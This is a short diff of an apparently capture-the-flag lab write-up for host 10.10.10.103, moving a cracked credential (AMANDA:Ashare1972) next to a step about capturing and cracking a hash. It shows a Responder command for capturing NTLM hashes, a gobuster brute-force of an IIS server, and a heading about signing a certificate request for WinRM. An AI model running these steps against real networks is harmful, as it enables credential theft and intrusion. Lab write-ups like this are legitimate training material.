@@ -40,14 +40,12 @@ Command=ToggleDesktop
 sudo responder -I tun0 -v
 ```
 
-Grab the hash and crack it to get credentials
+Grab the hash and crack it to get credentials `AMANDA:Ashare1972`
 
 ### /certsrv/ (Status: 401); feroxbuster won't miss it by default
 ```bash
 gobuster -k -u https://10.10.10.103 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -t 20 -s 200,204,301,302,307,403,401
 ```
-
-AMANDA:Ashare1972
 
 ### Sign CSR for winrm
 ##### One way..
